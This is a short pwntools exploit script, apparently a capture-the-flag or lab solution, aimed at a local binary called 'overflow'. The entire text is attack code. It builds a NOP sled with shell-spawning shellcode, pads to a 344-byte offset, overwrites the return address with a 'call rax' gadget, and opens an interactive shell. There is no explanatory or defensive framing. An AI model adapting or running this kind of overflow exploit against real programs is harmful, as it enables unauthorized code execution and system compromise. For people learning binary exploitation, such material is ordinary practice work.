from pwn import *
context(os='linux', arch='amd64')
context.log_level= 'debug'
proc = process('./overflow')
OFFSET = 344
out = proc.read()
print(out)

pause()
CALL_RAX = 0x401010
payload = b'\x90'*30
payload += asm(shellcraft.sh())
payload += b'\x90'*(OFFSET-len(payload))
payload += p64(CALL_RAX)

proc.writeline(payload)
out = proc.interactive()
# print(out)


